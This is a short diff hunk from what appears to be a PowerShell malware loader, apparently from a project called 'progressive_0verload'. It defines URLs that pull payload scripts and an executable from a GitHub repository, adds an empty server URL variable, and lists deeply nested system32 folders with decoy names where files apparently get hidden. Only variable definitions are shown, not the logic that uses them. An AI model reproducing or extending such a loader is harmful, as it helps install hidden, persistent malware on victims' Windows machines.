@@ -9,6 +9,7 @@ $user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')
 $initServiceRootmonmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_rootmonmon.ps1"
 $initServiceFwdmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwdmon.ps1"
 $initFinde = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/finde.exe"
+$serverUrl = ""
 $paths =  @(
     "$env:windir\system32\config\systemprofile\AppData\Local",
     "$env:windir\system32\LogFiles\WMI\RtBackup\AutoRecover\alpha\beta\gamma\unibeta\trioalpha\shadowdelta",
